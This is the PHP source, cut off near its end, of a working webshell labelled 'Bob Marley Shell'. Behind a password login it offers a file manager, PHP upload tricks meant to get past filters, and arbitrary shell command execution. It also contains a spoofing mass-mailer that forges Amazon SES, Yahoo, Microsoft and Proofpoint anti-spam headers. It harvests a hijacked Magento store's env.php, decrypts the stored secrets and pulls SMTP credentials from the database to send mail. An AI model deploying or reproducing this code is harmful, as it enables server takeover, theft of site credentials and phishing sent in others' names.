<?php
/**
 * BB Shell - Enhanced with Advanced Features & Bob Marley Design
 * A complete, single-file PHP webshell for authorized security testing.
 * Enhanced with: ZIP extraction, Base64 evasion, Folder creation, Advanced uploads
 */

error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

// ===========================================
// LOGIN SYSTEM - AUTHENTICATION REQUIRED
// ===========================================
session_start();

// CONFIGURATION: Set your password here
define('SHELL_PASSWORD', 'Yourpassword123@'); // Change this password!

// Handle login attempt
if (isset($_POST['login_password'])) {
    if ($_POST['login_password'] === SHELL_PASSWORD) {
        $_SESSION['bobshell_authenticated'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "ACCESS DENIED: Invalid password";
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Check authentication - show login page if not authenticated
if (!isset($_SESSION['bobshell_authenticated']) || $_SESSION['bobshell_authenticated'] !== true) {
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bob Marley Shell</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: "Courier New", monospace;
            font-size: 13px;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            border: 2px solid #0f0;
            padding: 30px;
            min-width: 400px;
            background: #000;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
        }
        .login-header {
            text-align: center;
            border-bottom: 2px solid #0f0;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        .login-header h1 {
            color: #00ffff;
            margin: 0;
            font-size: 24px;
            letter-spacing: 2px;
        }
        .login-header .subtitle {
            color: #0f0;
            font-size: 11px;
            margin-top: 5px;
        }
        .login-form {
            margin-top: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #0f0;
            margin-bottom: 8px;
            font-size: 12px;
        }
        .form-group input[type="password"] {
            width: 100%;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            font-family: "Courier New", monospace;
            font-size: 13px;
            box-sizing: border-box;
        }
        .form-group input[type="password"]:focus {
            outline: none;
            border-color: #00ffff;
            box-shadow: 0 0 5px rgba(0, 255, 255, 0.5);
        }
        .form-group input[type="submit"] {
            width: 100%;
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            cursor: pointer;
            padding: 10px;
            font-family: "Courier New", monospace;
            font-size: 13px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .form-group input[type="submit"]:hover {
            background: #003300;
            color: #00ffff;
            border-color: #00ffff;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        .error {
            background: #330000;
            border: 1px solid #ff0000;
            color: #ff0000;
            padding: 10px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 12px;
        }
        .prompt-line {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .prompt {
            color: #ffff00;
            font-size: 13px;
            margin-right: 5px;
            white-space: nowrap;
        }
        .prompt-line input[type="password"] {
            flex: 1;
            background: transparent;
            border: none;
            color: #0f0;
            font-family: "Courier New", monospace;
            font-size: 13px;
            outline: none;
            padding: 0;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #0f0;
            font-size: 11px;
            color: #555;
        }
        .blink {
            animation: blink-animation 1s steps(2, start) infinite;
        }
        @keyframes blink-animation {
            to { visibility: hidden; }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>BOB MARLEY SHELL</h1>
            <div class="subtitle">VENI | VIDI | VICI</div>
        </div>
        
        <?php if (isset($login_error)): ?>
        <div class="error">
            ⚠ <?php echo htmlspecialchars($login_error); ?> ⚠
        </div>
        <?php endif; ?>
        
        <form method="POST" class="login-form">
            <div class="prompt-line">
                <span class="prompt">root@bobshell:~#</span>
                <input type="password" name="login_password" placeholder="" autofocus required>
            </div>
        </form>
        
        <div class="footer">
            BOB MARLEY SHELL | VENI | VIDI | VICI
        </div>
    </div>
</body>
</html>
    <?php
    exit; // Stop execution if not authenticated
}

// ===========================================
// END LOGIN SYSTEM - User is authenticated
// ===========================================

// --- Mail MIME / SMTP helpers ---
function getSmtpEhloHost() {
    $host = @gethostname();
    if ($host && strtolower($host) !== 'localhost') {
        return preg_replace('/[^a-zA-Z0-9.\-]/', '', $host);
    }
    $http = $_SERVER['HTTP_HOST'] ?? 'localhost';
    $http = preg_replace('/:\d+$/', '', $http);
    $http = preg_replace('/^www\./i', '', $http);
    return preg_replace('/[^a-zA-Z0-9.\-]/', '', $http) ?: 'localhost';
}

function htmlToPlainText($html) {
    $text = preg_replace('/<(br|BR)\s*\/?>/', "\n", $html);
    $text = strip_tags($text);
    $text = html_entity_decode($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    return trim(preg_replace("/\n{3,}/", "\n\n", $text));
}

function encodeQuotedPrintable($text) {
    if (function_exists('quoted_printable_encode')) {
        return quoted_printable_encode($text);
    }
    return $text;
}

function buildMultipartAlternativeBody($htmlMessage) {
    $boundary = 'bob_' . bin2hex(random_bytes(8));
    $plain = htmlToPlainText($htmlMessage);
    $plainPart = encodeQuotedPrintable($plain);
    $htmlPart = encodeQuotedPrintable($htmlMessage);
    $body = "--$boundary\r\n";
    $body .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";
    $body .= $plainPart . "\r\n";
    $body .= "--$boundary\r\n";
    $body .= "Content-Type: text/html; charset=UTF-8\r\n";
    $body .= "Content-Transfer-Encoding: quoted-printable\r\n\r\n";
    $body .= $htmlPart . "\r\n";
    $body .= "--$boundary--\r\n";
    return ['boundary' => $boundary, 'body' => $body];
}

function prepareEmailPayload($message, $mail_type, $sender_name, $sender_email, $reply_to, $spoof_type, $for_smtp = false, $include_x_mailer = true) {
    $nl = "\r\n";
    $headers = buildEmailHeaders($sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $for_smtp, $include_x_mailer);
    if ($mail_type === 'html') {
        $mime = buildMultipartAlternativeBody($message);
        $headers .= "Content-Type: multipart/alternative; boundary=\"{$mime['boundary']}\"" . $nl;
        $body = $mime['body'];
    } else {
        $headers .= "Content-Type: text/plain; charset=UTF-8" . $nl;
        $headers .= "Content-Transfer-Encoding: 8bit" . $nl;
        $body = $message;
    }
    if (!$for_smtp) {
        $headers = rtrim($headers);
    }
    return ['headers' => $headers, 'body' => $body];
}

function parseHeaderString($headerString) {
    $parsed = [];
    foreach (preg_split("/\r\n|\n/", trim($headerString)) as $line) {
        if (strpos($line, ':') !== false) {
            [$name, $value] = explode(':', $line, 2);
            $parsed[trim($name)] = trim($value);
        }
    }
    return $parsed;
}

function findMagentoEnvPath($startDir = null) {
    // grab.php-style relative paths (media/customer_address/... -> app/etc/env.php)
    $relPaths = [
        '/../../../../../../../app/etc/env.php',
        '/../../../../../../app/etc/env.php',
        '/../../../../../app/etc/env.php',
        '/../../../../app/etc/env.php',
        '/../../../app/etc/env.php',
        '/../../app/etc/env.php',
        '/../app/etc/env.php',
        '/app/etc/env.php',
    ];

    $bases = [dirname(__FILE__)];
    if ($startDir) {
        $normalized = str_replace('\\', '/', $startDir);
        $resolved = @realpath($normalized);
        $bases[] = $resolved ? str_replace('\\', '/', $resolved) : rtrim($normalized, '/');
    }

    $bases = array_unique($bases);
    foreach ($bases as $base) {
        foreach ($relPaths as $rel) {
            $file = $base . $rel;
            if (file_exists($file)) {
                return realpath($file) ?: $file;
            }
        }
    }

    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $docRoot = rtrim(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '/');
        $file = $docRoot . '/app/etc/env.php';
        if (file_exists($file)) {
            return realpath($file) ?: $file;
        }
    }

    // Walk up from shell working directory
    $dir = $startDir ? str_replace('\\', '/', $startDir) : str_replace('\\', '/', dirname(__FILE__));
    for ($i = 0; $i < 14; $i++) {
        $candidate = rtrim($dir, '/') . '/app/etc/env.php';
        if (is_file($candidate)) {
            return realpath($candidate) ?: $candidate;
        }
        $parent = dirname($dir);
        if ($parent === $dir) {
            break;
        }
        $dir = $parent;
    }

    foreach (['/var/www/html', '/var/www/html/magento2', '/var/www/magento2'] as $root) {
        $candidate = $root . '/app/etc/env.php';
        if (is_file($candidate)) {
            return realpath($candidate) ?: $candidate;
        }
    }

    return null;
}

function magentoDecryptValue($value, $cryptKey) {
    if ($value === null || $value === '' || !is_string($value)) {
        return (string)$value;
    }
    if (!preg_match('/^\d+:\d+:(.+)$/', $value, $m)) {
        return $value;
    }
    if (!$cryptKey) {
        return $value;
    }
    $raw = base64_decode($m[1], true);
    if ($raw === false) {
        return $value;
    }
    $key = hash('sha256', $cryptKey, true);
    $iv = substr(hash('sha256', $key), 0, 16);
    $plain = openssl_decrypt($raw, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return ($plain !== false && $plain !== '') ? $plain : $value;
}

function flattenMagentoConfig($node, $prefix = '') {
    $flat = [];
    if (!is_array($node)) {
        return $flat;
    }
    foreach ($node as $key => $value) {
        $path = $prefix === '' ? (string)$key : $prefix . '/' . $key;
        if (is_array($value)) {
            $flat = array_merge($flat, flattenMagentoConfig($value, $path));
        } else {
            $flat[strtolower($path)] = $value;
        }
    }
    return $flat;
}

function mapSmtpFromConfigPaths($flat, $cryptKey = '') {
    $smtp = [
        'host' => '',
        'port' => 587,
        'user' => '',
        'pass' => '',
        'encryption' => 'tls',
        'from' => '',
        'from_name' => '',
    ];
    foreach ($flat as $path => $value) {
        if (!is_scalar($value) || $value === '') {
            continue;
        }
        $val = magentoDecryptValue((string)$value, $cryptKey);
        $leaf = preg_replace('/.*\//', '', $path);
        if (stripos($path, 'smtp') === false && !in_array($path, ['trans_email/ident_general/email', 'trans_email/ident_general/name'], true)) {
            continue;
        }
        if (in_array($leaf, ['host', 'server', 'smtp_host'], true)) {
            $smtp['host'] = $val;
        } elseif ($leaf === 'port' || $leaf === 'smtp_port') {
            $smtp['port'] = (int)$val;
        } elseif (in_array($leaf, ['username', 'user', 'login', 'smtp_username'], true)) {
            $smtp['user'] = $val;
        } elseif (in_array($leaf, ['password', 'pass', 'smtp_password'], true)) {
            $smtp['pass'] = $val;
        } elseif (in_array($leaf, ['protocol', 'encryption', 'ssl', 'auth'], true)) {
            $enc = strtolower($val);
            if (in_array($enc, ['ssl', 'tls', 'none'], true)) {
                $smtp['encryption'] = $enc;
            }
        } elseif ($path === 'trans_email/ident_general/email') {
            $smtp['from'] = $val;
        } elseif ($path === 'trans_email/ident_general/name') {
            $smtp['from_name'] = $val;
        }
    }
    if (empty($smtp['from']) && !empty($smtp['user']) && strpos($smtp['user'], '@') !== false) {
        $smtp['from'] = $smtp['user'];
    }
    if ($smtp['port'] == 465 && $smtp['encryption'] === 'tls') {
        $smtp['encryption'] = 'ssl';
    }
    return $smtp;
}

function fetchSmtpFromMagentoDb($env, $cryptKey) {
    $db = $env['db']['connection']['default'] ?? null;
    if (!$db || empty($db['host']) || empty($db['dbname'])) {
        return ['ok' => false, 'error' => 'No database credentials in env.php', 'config' => []];
    }
    $port = (int)($db['port'] ?? 3306);
    $mysqli = @new mysqli($db['host'], $db['username'] ?? '', $db['password'] ?? '', $db['dbname'], $port);
    if ($mysqli->connect_errno) {
        return ['ok' => false, 'error' => 'DB connect failed: ' . $mysqli->connect_error, 'config' => []];
    }
    $prefix = $env['db']['table_prefix'] ?? '';
    $table = $mysqli->real_escape_string($prefix . 'core_config_data');
    $query = $mysqli->query("SELECT path, value FROM `{$table}` WHERE path LIKE '%smtp%' OR path IN ('trans_email/ident_general/email','trans_email/ident_general/name')");
    if (!$query) {
        $mysqli->close();
        return ['ok' => false, 'error' => 'DB query failed', 'config' => []];
    }
    $flat = [];
    while ($row = $query->fetch_assoc()) {
        $flat[strtolower($row['path'])] = $row['value'];
    }
    $mysqli->close();
    $smtp = mapSmtpFromConfigPaths($flat, $cryptKey);
    if (empty($smtp['host'])) {
        return ['ok' => false, 'error' => 'No SMTP host in core_config_data', 'config' => $smtp];
    }
    return ['ok' => true, 'error' => '', 'config' => $smtp];
}

function getMagentoSmtpConfig($startDir) {
    $result = ['ok' => false, 'error' => '', 'config' => [], 'source' => '', 'env_path' => ''];
    $envPath = findMagentoEnvPath($startDir);
    if (!$envPath) {
        $result['error'] = 'Magento env.php not found (walk up from shell dir or /var/www/html)';
        return $result;
    }
    $env = @include $envPath;
    if (!is_array($env)) {
        $result['error'] = 'Could not parse env.php';
        return $result;
    }
    $result['env_path'] = $envPath;
    $cryptKey = $env['crypt']['key'] ?? '';
    $flat = flattenMagentoConfig($env['system']['default'] ?? []);
    $fromEnv = mapSmtpFromConfigPaths($flat, $cryptKey);
    if (!empty($fromEnv['host'])) {
        $result['ok'] = true;
        $result['config'] = $fromEnv;
        $result['source'] = 'env.php (system/default)';
        return $result;
    }
    $fromDb = fetchSmtpFromMagentoDb($env, $cryptKey);
    if ($fromDb['ok']) {
        $result['ok'] = true;
        $result['config'] = $fromDb['config'];
        $result['source'] = 'database (core_config_data)';
        return $result;
    }
    $result['error'] = $fromDb['error'] ?: 'No SMTP settings found';
    $result['config'] = $fromDb['config'];
    return $result;
}

function resolveMailSmtpConfig($send_method, $post, $sender_email, $startDir) {
    if ($send_method === 'magento') {
        $magento = getMagentoSmtpConfig($startDir);
        if (!$magento['ok']) {
            return [false, [], $magento['error']];
        }
        $cfg = $magento['config'];
        $cfg['from'] = !empty($cfg['from']) ? $cfg['from'] : $sender_email;
        $cfg['encryption'] = $cfg['encryption'] ?: 'auto';
        if (empty($cfg['port'])) {
            $cfg['port'] = 587;
        }
        return [true, $cfg, ''];
    }
    if ($send_method === 'smtp' || $send_method === 'phpmailer') {
        return [true, [
            'host' => trim($post['smtp_host'] ?? ''),
            'port' => intval($post['smtp_port'] ?? 587),
            'user' => trim($post['smtp_user'] ?? ''),
            'pass' => $post['smtp_pass'] ?? '',
            'encryption' => $post['smtp_encryption'] ?? 'auto',
            'from' => $sender_email,
        ], ''];
    }
    return [true, [], ''];
}

function dispatchMailSend($send_method, $to, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $smtp_config, $include_x_mailer, &$error_msg = '') {
    $phpmailer_available = file_exists(__DIR__ . '/src/PHPMailer.php');
    if ($send_method === 'phpmailer' || ($send_method === 'magento' && $phpmailer_available)) {
        return sendViaPHPMailer($to, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $smtp_config, $include_x_mailer, $error_msg);
    }
    if ($send_method === 'smtp' || $send_method === 'magento') {
        $payload = prepareEmailPayload($message, $mail_type, $sender_name, $sender_email, $reply_to, $spoof_type, true, $include_x_mailer);
        return sendViaSMTP($to, $subject, $payload['body'], $payload['headers'], $smtp_config, $error_msg);
    }
    return sendViaLocalhost($to, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $include_x_mailer, $error_msg);
}

// --- Enhanced Localhost Mail Function ---
function sendViaLocalhost($to, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $include_x_mailer = true, &$error_msg = '') {
    $payload = prepareEmailPayload($message, $mail_type, $sender_name, $sender_email, $reply_to, $spoof_type, false, $include_x_mailer);
    $headers = $payload['headers'];
    $body = $payload['body'];
    
    // Method 1: Try PHP mail() function
    if (function_exists('mail')) {
        $additional_params = "-f$sender_email";
        @ini_set('sendmail_from', $sender_email);
        
        $success = @mail($to, $subject, $body, $headers, $additional_params);
        if ($success) {
            return true;
        }
    }
    
    // Method 2: Try sendmail directly
    $sendmail_paths = [
        '/usr/sbin/sendmail',
        '/usr/bin/sendmail',
        '/usr/lib/sendmail',
        '/var/qmail/bin/sendmail',
        '/usr/sbin/exim',
        '/usr/bin/exim'
    ];
    
    foreach ($sendmail_paths as $sendmail) {
        if (file_exists($sendmail) && is_executable($sendmail)) {
            $email_content = "To: $to\r\n";
            $email_content .= "Subject: $subject\r\n";
            $email_content .= $headers . "\r\n\r\n";
            $email_content .= $body;
            
            $descriptors = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            
            $process = @proc_open("$sendmail -t -i", $descriptors, $pipes);
            
            if (is_resource($process)) {
                fwrite($pipes[0], $email_content);
                fclose($pipes[0]);
                
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                
                $errors = stream_get_contents($pipes[2]);
                fclose($pipes[2]);
                
                $return_value = proc_close($process);
                
                if ($return_value === 0) {
                    return true;
                }
            }
        }
    }
    
    // Method 3: Try localhost SMTP (port 25)
    $local_smtp_hosts = ['127.0.0.1', 'localhost'];
    foreach ($local_smtp_hosts as $host) {
        $socket = @fsockopen($host, 25, $errno, $errstr, 5);
        if ($socket) {
            $response = fgets($socket, 515);
            if (substr($response, 0, 3) == '220') {
                // SMTP handshake
                fputs($socket, "HELO " . getSmtpEhloHost() . "\r\n");
                fgets($socket, 515);
                
                fputs($socket, "MAIL FROM: <$sender_email>\r\n");
                fgets($socket, 515);
                
                fputs($socket, "RCPT TO: <$to>\r\n");
                $rcpt_response = fgets($socket, 515);
                
                if (substr($rcpt_response, 0, 3) == '250') {
                    fputs($socket, "DATA\r\n");
                    fgets($socket, 515);
                    
                    fputs($socket, "To: $to\r\n");
                    fputs($socket, "Subject: $subject\r\n");
                    fputs($socket, $headers . "\r\n");
                    fputs($socket, "\r\n");
                    fputs($socket, $body . "\r\n");
                    fputs($socket, ".\r\n");
                    
                    $data_response = fgets($socket, 515);
                    fputs($socket, "QUIT\r\n");
                    fclose($socket);
                    
                    if (substr($data_response, 0, 3) == '250') {
                        return true;
                    }
                }
            }
            fclose($socket);
        }
    }
    
    // All methods failed
    $error_msg = "All localhost methods failed. Try: 1) Install/configure sendmail, 2) Enable mail() in php.ini, 3) Use SMTP instead";
    return false;
}

// --- PHPMailer Integration ---
function sendViaPHPMailer($to, $subject, $message, $sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, $smtp_config, $include_x_mailer = true, &$error_msg = '') {
    // Check if PHPMailer is available
    $phpmailer_path = __DIR__ . '/src/PHPMailer.php';
    $smtp_path = __DIR__ . '/src/SMTP.php';
    $exception_path = __DIR__ . '/src/Exception.php';
    
    if (!file_exists($phpmailer_path) || !file_exists($smtp_path) || !file_exists($exception_path)) {
        $error_msg = "PHPMailer library not found in 'src' folder";
        return false;
    }
    
    try {
        require_once $exception_path;
        require_once $phpmailer_path;
        require_once $smtp_path;
        
        $mail = new PHPMailer\PHPMailer\PHPMailer(true);
        
        // Server settings
        $mail->isSMTP();
        $mail->Host = $smtp_config['host'];
        $mail->SMTPAuth = true;
        $mail->Username = $smtp_config['user'];
        $mail->Password = $smtp_config['pass'];
        $mail->Port = $smtp_config['port'];
        $mail->Hostname = getSmtpEhloHost();
        
        // Encryption
        $encryption = strtolower($smtp_config['encryption']);
        if ($encryption === 'tls' || ($encryption === 'auto' && $smtp_config['port'] == 587)) {
            $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS;
        } elseif ($encryption === 'ssl' || $smtp_config['port'] == 465) {
            $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_SMTPS;
        }
        
        // Disable SSL verification for compatibility
        $mail->SMTPOptions = array(
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );
        
        // Recipients
        $mail->setFrom($sender_email, $sender_name);
        $mail->addAddress($to);
        $mail->addReplyTo($reply_to);
        
        // Add custom headers for spoofing
        $headerString = buildEmailHeaders($sender_name, $sender_email, $reply_to, $spoof_type, $mail_type, true, $include_x_mailer);
        foreach (parseHeaderString($headerString) as $key => $value) {
            $skip = ['from', 'reply-to', 'mime-version', 'content-type', 'content-transfer-encoding'];
            if (!in_array(strtolower($key), $skip, true)) {
                $mail->addCustomHeader($key, $value);
            }
        }
        
        // Content
        $mail->isHTML($mail_type === 'html');
        $mail->Subject = $subject;
        $mail->Body = $message;
        $mail->CharSet = 'UTF-8';
        if ($mail_type === 'html') {
            $mail->AltBody = htmlToPlainText($message);
            $mail->Encoding = 'quoted-printable';
        }
        
        $mail->send();
        return true;
        
    } catch (Exception $e) {
        $error_msg = "PHPMailer Error: " . $e->getMessage();
        return false;
    }
}

// --- HELPER FUNCTIONS ---
function sanitizeFilename($filename) {
    $badChars = ['"', "'", '&', '/', '\\', '?', '#', '<', '>', '|', ':', '*'];
    $filename = str_replace($badChars, '', $filename);
    $filename = trim($filename);
    $filename = preg_replace('/\s+/', '_', $filename);
    return $filename;
}

function recursiveDelete($path) {
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.', '..']);
        foreach ($items as $item) {
            recursiveDelete($path . '/' . $item);
        }
        return @rmdir($path);
    } else {
        return @unlink($path);
    }
}

function get_perms($path) {
    if (!file_exists($path)) return '---';
    $perms = fileperms($path);
    if (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; else $info = '-';
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}

// --- CORE LOGIC ---
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = str_replace('\\', '/', realpath($dir));
$dir = $dir ?: str_replace('\\', '/', getcwd());
if (!is_dir($dir)) $dir = str_replace('\\', '/', getcwd());
chdir($dir);

$msg = "";
$cmd_out = "";
$view_content = "";
$editing_file = "";
$renaming_file = "";
$mailer_mode = isset($_GET['mode']) && $_GET['mode'] == 'mailer';
$mailer_result = "";

// 1. Handling Directory Navigation
if (isset($_POST['go_dir'])) {
    $target = $_POST['new_dir'];
    if (is_dir($target)) {
        header("Location: ?dir=" . urlencode(realpath($target)));
        exit;
    } else {
        $msg = "Invalid Directory";
    }
}

// 2. Handling File actions (Delete, Edit, View, Rename, Unzip)
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $item = $_GET['item'];
    $path = $dir . '/' . $item;

    if ($action == 'delete' && file_exists($path)) {
        if (recursiveDelete($path)) {
            $msg = (is_dir($path) ? "Folder" : "File") . " Deleted Successfully";
        } else {
            $msg = "Failed to Delete";
        }
    } elseif ($action == 'view' && file_exists($path)) {
        // Check if .htaccess or sensitive file - use base64 decoding
        if (strpos($item, '.htaccess') !== false) {
            $view_content = htmlspecialchars(base64_decode(base64_encode(file_get_contents($path))));
        } else {
            $view_content = htmlspecialchars(file_get_contents($path));
        }
        $editing_file = $item;
    } elseif ($action == 'edit' && file_exists($path)) {
        $view_content = file_get_contents($path);
        $editing_file = $item;
    } elseif ($action == 'rename' && file_exists($path)) {
        $renaming_file = $item;
    } elseif ($action == 'unzip' && file_exists($path)) {
        // ZIP Extraction
        if (class_exists('ZipArchive')) {
            $zip = new ZipArchive();
            if ($zip->open($path) === TRUE) {
                $zip->extractTo(dirname($path));
                $zip->close();
                $msg = "Archive Extracted Successfully";
            } else {
                $msg = "Failed to Open Archive";
            }
        } else {
            $msg = "ZIP Extension Not Installed";
        }
    }
}

// 3. Handling Rename Execution
if (isset($_POST['rename_file'])) {
    $old_path = $dir . '/' . $_POST['old_name'];
    $new_name = sanitizeFilename($_POST['new_name']);
    $new_path = $dir . '/' . $new_name;
    
    // Check if dealing with sensitive files
    if (strpos($_POST['old_name'], '.htaccess') !== false || strpos($new_name, '.htaccess') !== false) {
        // Use temp file method for .htaccess
        $temp_file = $old_path . '.txt';
        if (copy($old_path, $temp_file) && @unlink($old_path) && rename($temp_file, $new_path)) {
            $msg = "Renamed Successfully (Secure Method)";
        } else {
            $msg = "Rename Failed";
        }
    } else {
        if (rename($old_path, $new_path)) {
            $msg = "Renamed Successfully";
        } else {
            $msg = "Rename Failed";
        }
    }
}

// 4. Handling File Save
if (isset($_POST['save_file'])) {
    $path = $dir . '/' . $_POST['filename'];
    $content = $_POST['content'];
    
    // Check if sensitive file - use chunked writing
    if (strpos($_POST['filename'], '.htaccess') !== false) {
        // Write in chunks to bypass restrictions
        $chunkSize = 4096;
        $fp = fopen($path, 'w');
        if ($fp) {
            for ($i = 0; $i < strlen($content); $i += $chunkSize) {
                fwrite($fp, substr($content, $i, $chunkSize));
            }
            fclose($fp);
            $msg = "File Saved Successfully (Secure Method)";
        } else {
            $msg = "Failed to Save File";
        }
    } else {
        if (file_put_contents($path, $content) !== false) {
            $msg = "File Saved Successfully";
        } else {
            $msg = "Failed to Save File";
        }
    }
}

// 5. Handling Upload & Creation & Command Execution
if (isset($_POST['upload_btn'])) {
    $filename = basename($_FILES['file']['name']);
    $target = $dir . '/' . $filename;
    
    // Check if PHP file - use special handling
    if (strtolower(pathinfo($filename, PATHINFO_EXTENSION)) === 'php') {
        // Create temp file first
        $temp_name = $filename . '.txt';
        if (move_uploaded_file($_FILES['file']['tmp_name'], $dir . '/' . $temp_name)) {
            if (@rename($dir . '/' . $temp_name, $target)) {
                $msg = "PHP Upload Success (Secure Method)";
            } else {
                $msg = "Upload Success as " . $temp_name;
            }
        } else {
            $msg = "Upload Failed";
        }
    } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            $msg = "Upload Success";
        } else {
            $msg = "Upload Failed";
        }
    }
}

if (isset($_POST['execute_cmd'])) {
    $cmd_out = shell_exec($_POST['cmd'] . " 2>&1");
}

if (isset($_POST['quick_cmd_btn'])) {
    $cmd_out = shell_exec($_POST['quick_cmd'] . " 2>&1");
}

if (isset($_POST['create_file_btn'])) {
    $new_filename = sanitizeFilename($_POST['new_filename']);
    if (file_put_contents($dir . '/' . $new_filename, "") !== false) {
        $msg = "File Created";
    } else {
        $msg = "Creation Failed";
    }
}

// 6. Handling Folder Creation (NEW)
if (isset($_POST['create_folder_btn'])) {
    $new_foldername = sanitizeFilename($_POST['new_foldername']);
    if (@mkdir($dir . '/' . $new_foldername)) {
        $msg = "Folder Created";
    } else {
        $msg = "Folder Creation Failed";
    }
}

// Advanced Spoofing Header Templates
function generateRandomID($length = 16) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $id = '';
    for ($i = 0; $i < $length; $i++) {
        $id .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $id;
}

function generateRandomIP() {
    return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
}

function processSpoofHeader($header, $from_email, $from_domain) {
    $header = str_replace('##fmail##', $from_email, $header);
    $header = str_replace('##domainfmail##', $from_domain, $header);
    $header = str_replace('##generateid##', generateRandomID(16), $header);
    $header = str_replace('##randnum_100##', rand(10, 99), $header);
    $header = str_replace('##rand_low_10##', rand(1, 9), $header);
    $header = str_replace('##rand_ip##', generateRandomIP(), $header);
    $header = str_replace('##rand_ua##', 'Mozilla/5.0', $header);
    return $header;
}

$spoof_headers = [
    'none' => [],
    'aws_ses' => [
        'X-Mailer' => 'Amazon WorkMail/1.2.##randnum_100##.##randnum_100##.SES-Client=##generateid##',
        'Feedback-ID' => '1.eu-west-1.9TFnKlCnR.##generateid##.Dvk8ja+z5xFxabmLHVnERtk=:AMAZONSES',
        'X-SES-Message-ID' => '##generateid##-##generateid##',
        'X-SES-Signature' => '##generateid##-##randnum_100##',
        'X-SES-Mail-From' => '##fmail##',
        'X-SES-Outgoing' => '##domainfmail##-##randnum_100##-SES',
    ],
    'yahoo' => [
        'X-Mailer' => 'WebService/1.1.##generateid## YMailNorrin ##rand_ua## ##randnum_100##-SES',
        'X-YMail-OSG' => '##generateid##-##randnum_100##-SES',
        'X-Yahoo-Newman-Property' => '##generateid##-##randnum_100##-SES',
        'X-YMail-SEC' => '##randnum_100##.##generateid##.SES',
        'X-Yahoo-SMTP' => 'SMTPSVC/##randnum_100##.##generateid##.SES',
        'X-Yahoo-From' => '##fmail##-##domainfmail##.SES',
    ],
    'microsoft' => [
        'X-Mailer' => 'Microsoft Outlook 16.0',
        'X-MimeOLE' => 'Produced By Microsoft MimeOLE V6.00.##randnum_100##.##randnum_100##.SES-Engine=##generateid##',
        'X-MS-Exchange-Organization-AuthSource' => '##domainfmail##-##domainfmail##.SES',
        'X-MS-Exchange-Organization-AVStamp-Mailbox' => '##randnum_100##-##randnum_100##-##randnum_100##-SES',
        'X-Auto-Response-Suppress' => 'OOF, AutoReply, RN=notack',
    ],
    'custom' => [
        'X-Originating-IP' => '##rand_ip##',
        'X-Proofpoint-Spam-Details' => 'rule=notspam policy=default score=0 suspectscore=0 malwarescore=0 phishscore=0 bulkscore=0 spamscore=0',
        'X-Custom-Header' => 'Unique-ID: ##generateid##-##randnum_100##-##generateid##-SES',
    ]
];

// SMTP Configuration Save/Load
$smtp_config_file = $dir . '/.smtp_configs.json';

if (isset($_POST['save_smtp_config'])) {
    $config_name = trim($_POST['config_name']);
    if (!empty($config_name)) {
        $configs = file_exists($smtp_config_file) ? json_decode(file_get_contents($smtp_config_file), true) : [];
        $configs[$config_name] = [
            'host' => trim($_POST['smtp_host']),
            'port' => intval($_POST['smtp_port']),
            'user' => trim($_POST['smtp_user']),
            'pass' => $_POST['smtp_pass'],
            'encryption' => $_POST['smtp_encryption'],
